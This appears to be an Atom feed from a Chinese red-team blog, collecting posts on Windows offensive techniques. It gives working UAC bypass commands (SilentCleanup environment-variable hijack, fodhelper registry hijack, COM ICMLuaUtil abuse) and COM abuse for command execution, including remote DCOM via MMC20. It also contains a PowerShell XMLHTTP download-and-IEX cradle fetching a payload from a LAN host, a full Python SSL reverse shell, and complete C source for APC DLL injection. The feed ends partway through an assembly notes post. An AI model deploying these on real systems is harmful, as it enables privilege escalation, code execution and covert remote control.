  
  <entry>
    <title>bypass UAC研究</title>
    <link href="http://422926799.github.io/posts/70084607.html"/>
    <id>http://422926799.github.io/posts/70084607.html</id>
    <published>2020-10-07T16:46:32.000Z</published>
    <updated>2020-10-07T17:51:01.433Z</updated>
    
    <content type="html"><![CDATA[<p>水了一天，明天出发准备上学。先去玩几天，早上原本就打算写<br>刷b站硬是刷到了晚上</p><h2 id="UAC是何物"><a href="#UAC是何物" class="headerlink" title="UAC是何物"></a>UAC是何物</h2><blockquote><p>用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为”恶意软件”）损坏系统的效果。<br>主要用于隔离administrator和user的权限<br><img src="https://s1.ax1x.com/2020/10/08/0wPgn1.png" alt=""></p></blockquote><p>高:<br>任何程序启动都需要申请</p><p>默认：<br>UAC在不手动更改的情况下，程序需要administrator权限的时候。会弹出框框申请</p><p>中:<br>申请administrator权限不弹出申请框框，默认允许</p><p>从不提醒：<br>所有程序启动皆为administrator权限</p><h2 id="bypass-UAC的要求"><a href="#bypass-UAC的要求" class="headerlink" title="bypass UAC的要求"></a>bypass UAC的要求</h2><p>UAC设置为默认或更低<br>低权用户有权限执行的（可以是COM，计划任务，dll劫持等）</p><h2 id="交互式bypass"><a href="#交互式bypass" class="headerlink" title="交互式bypass"></a>交互式bypass</h2><p>例如：执行了MMC，然后在MMC打开文件选项选择cmd.exe执行<br><img src="https://s1.ax1x.com/2020/10/08/0wiWKs.png" alt=""></p><p>利用权限继承，在一个有administrator权限的进程里执行另外的进程从而实现绕过UAC<br>但是这种始终无法真正的利用</p><h2 id="方式一：利用自带的计划任务"><a href="#方式一：利用自带的计划任务" class="headerlink" title="方式一：利用自带的计划任务"></a>方式一：利用自带的计划任务</h2><p>\Microsoft\Windows\DiskCleanup\SilentCleanup计划任务</p><pre><code># cmdsetx windir cmd /kschtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /Ior# powershellNew-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force #用户环境变量注册表schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</code></pre><p>原因：\Microsoft\Windows\DiskCleanup\SilentCleanup服务以administrator运行，且计划任务任何用户都可以启动。启动程序使用用户变量%windir%这样去执行程序，通过修改用户变量课可实现bypass UAC<br><img src="https://s1.ax1x.com/2020/10/08/0wiHGF.png" alt=""></p><p>计划任务的设置如下<br><img src="https://s1.ax1x.com/2020/10/08/0wiOM9.png" alt=""></p><p>执行的操作<br><img src="https://s1.ax1x.com/2020/10/08/0wFSIK.png" alt=""></p><h2 id="方法二：程序以高权执行某些进程"><a href="#方法二：程序以高权执行某些进程" class="headerlink" title="方法二：程序以高权执行某些进程"></a>方法二：程序以高权执行某些进程</h2><p>例如：<br>fodhelper.exe和computerdefaults.exe存在bypass UAC</p><pre><code># powershellNew-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -ForceNew-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -ForceSet-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -ForceStart-Process &quot;C:\Windows\System32\fodhelper.exe&quot;Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Forceor# cmdreg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d &quot;&quot;reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d cmd.exefodhelper.exereg delete HKCU\Software\Classes\ms-settings\ /F</code></pre><p><img src="https://s1.ax1x.com/2020/10/08/0wFCGD.png" alt=""></p><p>通过进程监测可以看到如下过程<br><img src="https://s1.ax1x.com/2020/10/08/0wFPRe.png" alt=""></p><p>首先寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:(Default)</code></pre><p>然后在寻找了</p><pre><code>HKCU\Software\Classes\ms-settings\Shell\Open\command key:DelegateExecute</code></pre><p>当HKCU\Software\Classes\ms-settings\Shell\Open\command路径找不到的时候才去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command<br><img src="https://s1.ax1x.com/2020/10/08/0wF6dx.png" alt=""></p><p>Shell\Open\Command默认键名(Default)为所执行的程序,DelegateExecute为对应COM接口的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wF2FK.png" alt=""></p><h2 id="方法三：COM接口函数劫持"><a href="#方法三：COM接口函数劫持" class="headerlink" title="方法三：COM接口函数劫持"></a>方法三：COM接口函数劫持</h2><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数，例如：cmdlua.dll里的shellExecW，GUID：3E5FC7F9-9A51-4367-9063-A120244FBEC7<br>OleViewDotNet（Administrator权限运行）查询对应的CLSID<br><img src="https://s1.ax1x.com/2020/10/08/0wFxyj.png" alt=""></p><p>然后跟踪这个ICMLuaUtil接口可以看到下面的函数<br><img src="https://s1.ax1x.com/2020/10/08/0wkZ6J.png" alt=""></p><p>IDA反编译对应的DLL通过虚函数表搜索地址/搜索关键字ICMLuaUtil可以看到下面的函数<br>从0开始数到9，shellExec正好对应Proc9<br><img src="https://s1.ax1x.com/2020/10/08/0wkKTx.png" alt=""></p><p>然后只需要编写调用COM接口即可<br>注意：这里CPP定义的接口函数数量和IDA反编译出来的数量一样（除了要调用的函数）<br><img src="https://s1.ax1x.com/2020/10/08/0wkYXd.png" alt=""></p><p>编译好对应的dll后，使用rundll32调用效果如下<br><img src="https://s1.ax1x.com/2020/10/08/0wka7t.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果是劫持环境变量，从计划任务找bypass UAC的话注意两点： （只适用于 windows10，windows7或以下的在设置计划任务的时候，环境变量是什么就一直是那个环境变量的值，不会在改变。除非删除任务重新弄）</p><ul><li>计划任务状态为非禁用</li><li>计划任务的触发器为:启动程序 (其他的话要按照对应的触发器是触发)</li><li>详细信息的里路径程序带参数，且参数用户的用户环境变量</li></ul><p>COM接口劫持需要先找到一些在system32目录下的dll，一般都是系统自带的COM接口<br>然后从这些接口里寻找可用的函数</p><p>一般利用COM都是自动化搜索然后人工审计多</p><p>DLL劫持因为时间问题暂时没复现</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1" target="_blank" rel="noopener">https://swapcontext.blogspot.com/2020/10/uacme-35-wd-and-ways-of-mitigation.html?m=1</a><br><a href="https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz" target="_blank" rel="noopener">https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</a><br>COM劫持代码来源：<a href="https://www.write-bug.com/article/2000.html" target="_blank" rel="noopener">https://www.write-bug.com/article/2000.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;水了一天，明天出发准备上学。先去玩几天，早上原本就打算写&lt;br&gt;刷b站硬是刷到了晚上&lt;/p&gt;
&lt;h2 id=&quot;UAC是何物&quot;&gt;&lt;a href=&quot;#UAC是何物&quot; class=&quot;headerlink&quot; title=&quot;UAC是何物&quot;&gt;&lt;/a&gt;UAC是何物&lt;/h2&gt;&lt;blockq</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>COM接口学习与利用</title>
    <link href="http://422926799.github.io/posts/ed9cc210.html"/>
    <id>http://422926799.github.io/posts/ed9cc210.html</id>
    <published>2020-10-02T17:03:33.000Z</published>
    <updated>2020-10-02T17:18:51.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为COM"><a href="#何为COM" class="headerlink" title="何为COM"></a>何为COM</h2><p>OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。</p><p>找了篇文章编写了一个COM接口<br>参考链接:<a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br>COM接口里有个calc函数<br><img src="https://s1.ax1x.com/2020/10/03/01Qete.png" alt=""></p><p>生成DLL后，用regsvr32注册完后，可以在HKEY_CLASSES_ROOT\CLSID\下可以见到注册好的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QmfH.md.png" alt=""></p><p>使用powershell可以查询对应COM的可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;)) #枚举对于appid可用的函数$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QK1A.png" alt=""></p><p>调用对应COM接口的函数</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;20CE411F-4415-4017-B797-66AE3B8C9A4D&quot;))$handle.calc()</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01Q30f.png" alt=""></p><h2 id="注册表路径说明"><a href="#注册表路径说明" class="headerlink" title="注册表路径说明"></a>注册表路径说明</h2><p>HKEY_CLASSES_ROOT\CLSID 所有COM接口对应的CLSID都在这个项或子项下<br><img src="https://s1.ax1x.com/2020/10/03/01QYtg.png" alt=""></p><p>CLSID项下场见的子项</p><pre><code>* lnprocServer32* TypeLib* version* progID</code></pre><p>lnprocServer32写着这个COM接口处理的dll<br><img src="https://s1.ax1x.com/2020/10/03/01QUpj.png" alt=""></p><p>InprocServer32写着接口的信息/版本<br><img src="https://s1.ax1x.com/2020/10/03/01Qdcn.png" alt=""></p><h2 id="枚举机器上所有的CLSID"><a href="#枚举机器上所有的CLSID" class="headerlink" title="枚举机器上所有的CLSID"></a>枚举机器上所有的CLSID</h2><p>指定类名为WIN32_DCOMApplication</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QwXq.png" alt=""></p><p>Get-CimInstance （简写：Get-cim）作用：从CIM服务器获取类的CIM实例<br><img src="https://s1.ax1x.com/2020/10/03/01QBn0.png" alt=""></p><p>CIM：公共信息模型（CIM）是用于描述受管理资源（如存储，网络或软件组件）的结构和行为的DMTF标准[DSP0004]。</p><p>查询指定CLSID可用函数</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C5EDFC9D-B018-41A4-9877-39AB18469C3A&quot;))$obj | get-member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QDBV.png" alt=""></p><p>快速提起所有CLSID和对应的CLSID里的函数</p><pre><code>Get-CimInstance -ClassName WIN32_DCOMApplication | Select-Object appid | out-file clsids.txt$Position  = 1$Filename = &quot;win10-clsid-members.txt&quot;$inputFilename = &quot;clsids.txt&quot;ForEach($CLSID in Get-Content $inputFilename) {      Write-Output &quot;$($Position) - $($CLSID)&quot;      Write-Output &quot;------------------------&quot; | Out-File $Filename -Append      Write-Output $($CLSID) | Out-File $Filename -Append      $handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))      $handle | Get-Member | Out-File $Filename -Append      $Position += 1}</code></pre><p>（Method为方法，Property为参数设置之类的）<br><img src="https://s1.ax1x.com/2020/10/03/01QTAO.md.png" alt=""></p><p>枚举某个Application</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Excel.Application&quot;))  $obj | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QH4e.png" alt=""></p><p>属性继续枚举</p><pre><code>$obj =[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;49B2791A-B1AE-4C90-9B8E-E860BA07F889&quot;))$obj.Document | Get-Member</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01QL3d.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01Qvut.png" alt=""></p><h2 id="寻找可利用的COM接口"><a href="#寻找可利用的COM接口" class="headerlink" title="寻找可利用的COM接口"></a>寻找可利用的COM接口</h2><p>对应的CLSID是MMC.exe（那么是否代表着系统自带的程序可以执行命令的话，可以找找一个COM接口的函数），如果是不开源的话只能用IDA或Oleview.exe反编译了<br><img src="https://s1.ax1x.com/2020/10/03/01QzHf.md.png" alt=""></p><p>COM接口里枚举出来的函数（如果是微软公开的话）可以到：<a href="https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/search/?dataSource=previousVersions&amp;terms=</a> 搜索<br>例如：ExecuteShellCommand <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand</a><br><img src="https://s1.ax1x.com/2020/10/03/01l9US.png" alt=""></p><p>调用函数（注意:如果注册表查询CLSID子项带有ProgID的话需要指定ProgID调用方法或属性）<br><img src="https://s1.ax1x.com/2020/10/03/01lC4g.png" alt=""></p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lkgs.png" alt=""></p><p>思考：能不能通过微软文档搜索比如什么：Exec,command,file.urldownload这些函数，如果找的到在CLSID项里搜索对应的exe/dll，然后调用呢。或在HKEY_CLASSES_ROOT\CLSID下寻找有ProgID的子项CLSID，寻找可利用项。为什么要找带有ProgID子项的CLSID？因为这些一般都是系统自带的</p><h2 id="利用COM接口"><a href="#利用COM接口" class="headerlink" title="利用COM接口"></a>利用COM接口</h2><p>可以根据对应COM接口枚举出的函数名进行分析，或者猜解。例如</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;00020906-0000-0000-C000-000000000046&quot;))$handle.ExecuteExcel4Macro(&quot;EXEC(&quot;&quot;calc.exe&quot;&quot;)&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lK5F.png" alt=""></p><blockquote><p>比如，F5078F35-C551-11D3-89B9-0000F81FE221}这个COM对象（Msxml2.XMLHTTP.3.0）对外提供了一个XML HTTP 3.0功能，可以用来下载任意代码并执行，无需将payload写入磁盘，也不会触发基于System.Net.WebClient的常用检测规则。XML HTTP 3.0对象通常用来发起AJAX请求。在这种情况下，获取数据的方式非常简单，直接使用Invoke-Expression cmdlet（IEX）即可。</p></blockquote><pre><code>$o = [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;));$o.Open(&quot;GET&quot;, &quot;http://192.168.1.106/payload.txt&quot;, $False);$o.Send();IEX $o.responseText;</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01l129.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01l3vR.png" alt=""></p><p>对应的open函数反汇编<br><img src="https://s1.ax1x.com/2020/10/03/01lGK1.png" alt=""></p><p>文章里有用 Oleview.exe进行对dll的反编译，也有用IDA对指定DLL的函数进行分析。需要一定的基础进行分析<br>COM的利用方式：</p><pre><code>* 寻找COM接口对应注册表的lnprocServer32缺少的dll/exe替换进行提权* 利用COM接口远程调用</code></pre><p>COM远程利用：</p><pre><code>$handle = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.113.130&quot;))$handle.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)</code></pre><p><img src="https://s1.ax1x.com/2020/10/03/01lJDx.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/10/03/01lYb6.md.png" alt=""></p><p>参考链接:<br><a href="https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaokang088/archive/2011/05/16/2047376.html</a><br><a href="https://www.anquanke.com/post/id/217928" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217928</a><br><a href="https://www.anquanke.com/post/id/179927" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179927</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为COM&quot;&gt;&lt;a href=&quot;#何为COM&quot; class=&quot;headerlink&quot; title=&quot;何为COM&quot;&gt;&lt;/a&gt;何为COM&lt;/h2&gt;&lt;p&gt;OM component（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>ssl反弹shell(py)</title>
    <link href="http://422926799.github.io/posts/aa01a75d.html"/>
    <id>http://422926799.github.io/posts/aa01a75d.html</id>
    <published>2020-09-25T06:40:50.000Z</published>
    <updated>2020-09-25T06:49:38.220Z</updated>
    
    <content type="html"><![CDATA[<p>之前在星球发过一个py反弹windows shell的。昨天看了篇py ssl反弹shell的<br>想着把之前那个也改一下</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>openssl生成证书</p><pre><code>openssl genrsa -out server.key 1024openssl req -new -x509 -days 3650 -key server.key -out server.crt -subj &quot;/C=CN/ST=mykey/L=mykey/O=mykey/OU=mykey/CN=domain1/CN=domain2/CN=domain3&quot;</code></pre><p>server：</p><pre><code class="python">import socketimport sslimport optparseimport osdef main(ip,port,cert,key):    try:        port=int(port)    except:        print(&quot;[-] set port 1-65535&quot;)        exit()    if os.path.exists(cert) and os.path.exists(key):        pass    else:        print(&quot;[-] ssl cert:{} or ssl key:{} not found&quot;.format(cert,key))        exit()    print(&quot;bind {}:{}&quot;.format(ip,port))    s=socket.socket()    ssl_s=ssl.wrap_socket(s,certfile=cert,keyfile=key,                          ssl_version=ssl.PROTOCOL_TLSv1)    ssl_s.bind((str(ip),port))    ssl_s.listen(3)    conn, addr = ssl_s.accept()    print(&quot;[+] connection {}&quot;.format(addr))    while True:        user = input()        if len(user)&gt;0:            conn.sendall(user.encode())        else:            continue        data=b&quot;&quot;        cmdlen = conn.recv(99999)        cmdlen=int(cmdlen)        while len(data)&lt;cmdlen:            data+=conn.recv(99999)        print(data.decode())if __name__ == &#39;__main__&#39;:    parser=optparse.OptionParser()    parser.add_option(&quot;-i&quot;,dest=&quot;ip&quot;,help=&quot;set ip&quot;)    parser.add_option(&quot;-p&quot;,dest=&quot;port&quot;,help=&quot;set port&quot;)    parser.add_option(&quot;-c&quot;,dest=&quot;cert&quot;,help=&quot;set ssl cert&quot;)    parser.add_option(&quot;-k&quot;,dest=&quot;key&quot;,help=&quot;set ssl key&quot;)    option,args=parser.parse_args()    if option.ip and option.port and option.cert and option.key:        main(option.ip,option.port,option.cert,option.key)    else:        parser.print_help()        print(&quot;Example:python server.py -i &lt;ip&gt; -p &lt;port&gt; -c &lt;sslcert&gt; -k &lt;sslkey&gt;&quot;)</code></pre><p>client.py</p><pre><code class="py">import socketimport osimport reimport ssls=socket.socket()s=ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1)s.connect((&quot;192.168.113.145&quot;,4444))while True:    path=os.getcwd()    data=s.recv(1024).decode().rstrip(&#39;\n&#39;)    if len(data)&gt;0:        data=&quot;cd /d {}&amp;&quot;.format(os.getcwd())+data+&quot;&amp;echo [S]&amp;cd&amp;echo [E]&quot;        cmd = os.popen(data).read()        path2 = re.findall(&quot;\[S\]\n.*\n\[E\]&quot;, cmd)        if len(path2) &gt; 0:            path = str(path2[0]).replace(&quot;\n&quot;, &quot;&quot;).replace(&quot;[S]&quot;, &quot;&quot;).replace(&quot;[E]&quot;, &quot;&quot;)            os.chdir(path)        cmd=re.sub(&quot;\[S\]\n.*\n\[E\]&quot;,&quot;&quot;,cmd)        sed=cmd+path+&quot;&gt;&quot;        cmd_length=str(len(sed.encode(&quot;utf-8&quot;))).encode()        cmd_data=sed.encode(&quot;utf-8&quot;)        s.sendall(cmd_length)        s.sendall(cmd_data)    else:        s.sendall(path.encode(&quot;utf-8&quot;))</code></pre><p>效果如下：<br><img src="https://s1.ax1x.com/2020/09/25/09dPJS.png" alt="09dPJS.png"><br><img src="https://s1.ax1x.com/2020/09/25/09diRg.png" alt="09diRg.png"></p><p>找个时间写个golang的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前在星球发过一个py反弹windows shell的。昨天看了篇py ssl反弹shell的&lt;br&gt;想着把之前那个也改一下&lt;/p&gt;
&lt;h2 id=&quot;code&quot;&gt;&lt;a href=&quot;#code&quot; class=&quot;headerlink&quot; title=&quot;code&quot;&gt;&lt;/a&gt;code</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>APC dll注入</title>
    <link href="http://422926799.github.io/posts/c9faf9c0.html"/>
    <id>http://422926799.github.io/posts/c9faf9c0.html</id>
    <published>2020-09-24T04:27:53.000Z</published>
    <updated>2020-09-24T04:32:13.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理和要求"><a href="#原理和要求" class="headerlink" title="原理和要求"></a>原理和要求</h2><p>APC注入原理：<br>APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入。</p><p>APC注入要求：</p><pre><code>1.必须是多线程环境下2.注入的程序必须会调用上面的那些同步对象.那么我们可以注入APC,注意下条件,也不是所有都能注入的.注入方法的原理:1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数3.我们利用QueueUserApc,往这个队列中插入一个回调4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code class="c">#include &quot;stdafx.h&quot;#include&lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;void GetErr() {        printf(&quot;Error:%d&quot;, GetLastError());        printf(&quot;\n&quot;);        exit(1);}int getprocess(WCHAR *processname) {        HANDLE  data = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (data == INVALID_HANDLE_VALUE) {               printf(&quot;[-] CreateToolhelp32Snapshot failure&quot;);               GetErr();        }        else {               PROCESSENTRY32W pe = { sizeof(pe) };               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               for (bool dd = Process32FirstW(data, &amp;pe);dd;dd = Process32NextW(data,  &amp;pe)) {                       WCHAR *pname = pe.szExeFile;                       int pid = pe.th32ProcessID;                       if (wcscmp(processname, pname) == 0) {                              WCHAR info[650] =TEXT(&quot;name:&quot;);                              lstrcatW(info, pname);                              lstrcatW(info, TEXT(&quot; &quot;));                              wprintf(info);                              wprintf(TEXT(&quot;pid:&quot;));                              printf(&quot;%d\n&quot;, pid);                              return pid;                       }               }        }        return 0;}BOOL apcinject(int pid,WCHAR *dll) {        HANDLE openprocess = OpenProcess(PROCESS_ALL_ACCESS,0 ,pid);        if (openprocess == 0) {               GetErr();        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vt = VirtualAllocEx(openprocess, 0, 1024, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx faliure\n&quot;);               GetErr();        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        SIZE_T dwRet;        bool write = WriteProcessMemory(openprocess, vt, dll, MAX_PATH, &amp;dwRet);        if (write == 0) {               printf(&quot;[-] WriteProcessMemory faiure&quot;);               GetErr();        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        THREADENTRY32 te = { sizeof(te) };        HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);        if (handleSnap == INVALID_HANDLE_VALUE)        {               printf(&quot;[-] CreateToolhelp32Snapshot faiure&quot;);               GetErr();        }else {               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               /*               if (Thread32First(handleSnap, &amp;te))               {                       do {                              if (te.th32OwnerProcessID == pid)                              {                                      printf(&quot;%d\n&quot;, te.th32OwnerProcessID);                              }                       } while (Thread32Next(handleSnap, &amp;te));               }                       */               for (bool td = Thread32First(handleSnap, &amp;te);td;td =  Thread32Next(handleSnap, &amp;te)) {                       if (te.th32OwnerProcessID == pid) {                              int tid = te.th32ThreadID;                              HANDLE openthread = OpenThread(THREAD_ALL_ACCESS, 0, tid);                              if (openthread == 0) {                                      printf(&quot;[-] OpenThread faiure&quot;);                                      GetErr();                              }                              else {                                      printf(&quot;[*] OpenThread Sucess threadid:%d\n&quot;,tid);                                      DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW,  openthread, (ULONG_PTR)vt);                                      if (dwRet == 0) {                                             printf(&quot;[-] QueueUserAPC failure\n&quot;);                                             GetErr();                                      }                                      else {                                             printf(&quot;[+] APC Dll inject Sucess\n&quot;);                                      }                              }                       }               }        }        return true;}int main(){        WCHAR *name = TEXT(&quot;calc.exe&quot;);        WCHAR *dll = TEXT(&quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;);        int pid = getprocess(name);        if (pid != 0) {               apcinject(pid, dll);        }        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/24/wzcGgU.png" alt=""></p><p>试了一下，explorer、calc都能注</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理和要求&quot;&gt;&lt;a href=&quot;#原理和要求&quot; class=&quot;headerlink&quot; title=&quot;原理和要求&quot;&gt;&lt;/a&gt;原理和要求&lt;/h2&gt;&lt;p&gt;APC注入原理：&lt;br&gt;APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编学习总结</title>
    <link href="http://422926799.github.io/posts/7a38fa87.html"/>
    <id>http://422926799.github.io/posts/7a38fa87.html</id>
    <published>2020-09-21T11:20:18.000Z</published>
    <updated>2020-09-21T15:22:34.927Z</updated>
    
    <content type="html"><![CDATA[<p>好久没看汇编了，怕忘。复习一下顺便写一下总结</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>汇编语言（Assembly Language）是任何一种用于电子计算机、微处理器、微控制器或其他可编程器件的低级语言，亦称为符号语言。在汇编语言中，用助记符代替机器指令的操作码，用地址符号或标号代替指令或操作数的地址。在不同的设备中，汇编语言对应着不同的机器语言指令集，通过汇编过程转换成机器指令。特定的汇编语言和特定的机器语言指令集是一一对应的，不同平台之间不可直接移植</p></blockquote><p>一个CPU的构成，简单的来说：</p><ul><li>汇编架构</li><li>CPU厂家自身的指令</li></ul><p>常见的汇编架构：</p><ul><li>X86</li><li>ARM</li><li>MIPS</li><li>AVR<br>……</li></ul><p>每一个汇编架构的指令都有所不同，这里主要是x86框架的指令。</p><h2 id="x86的历史"><a href="#x86的历史" class="headerlink" title="x86的历史"></a>x86的历史</h2><blockquote><p>1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。x86指的是特定微处理器执行的一些计算机语言指令集，定义了芯片的基本使用规则，一如今天的x64、IA64等。</p></blockquote><blockquote><p>86指令集是美国Intel公司为其第一块16位CPU(i8086)专门开发的，美国IBM公司1981年推出的世界第一台PC机中的CPU–i8088(i8086简化版)使用的也是X86指令，同时电脑中为提高浮点数据处理能力而增加的X87芯片系列数学协处理器则另外使用X87指令，以后就将X86指令集和X87指令集统称为X86指令集。虽然随着CPU技术的不断发展，Intel陆续研制出更新型的i80386、i80486直到今天的Pentium 4(以下简为P4)系列，但为了保证电脑能继续运行以往开发的各类应用程序以保护和继承丰富的软件资源，所以Intel公司所生产的所有CPU仍然继续使用X86指令集，所以它的CPU仍属于X86系列。</p></blockquote><h3 id="x64-x86"><a href="#x64-x86" class="headerlink" title="x64-x86"></a>x64-x86</h3><blockquote><p>x86-64（ 又称x64，即英文词64-bit extended，64位拓展 的简写）是<strong>x86架构</strong>的64位拓展，向后兼容于16位及32位的x86架构。x64于1999年由AMD设计，AMD首次公开64位集以扩展给x86，称为“AMD64”。其后也为英特尔所采用，现时英特尔称之为“Intel 64”，在之前曾使用过“Clackamas Technology” (CT)、“IA-32e”及“EM64T”。<br>苹果公司和RPM包管理员以“x86-64”或“x86_64”称呼此64位架构。甲骨文公司及Microsoft称之为“x64”。BSD家族及其他Linux发行版则使用“x64-64”，32位版本则称为“i386”（或 i486/586/686），Arch Linux用x86_64称呼此64位架构。</p></blockquote><h2 id="高等语言的执行过程"><a href="#高等语言的执行过程" class="headerlink" title="高等语言的执行过程"></a>高等语言的执行过程</h2><p>C:<br>编译好的程序-&gt;汇编-&gt;指令</p><p>越高级的语言执行过程越慢，但是处理好的另说</p><h2 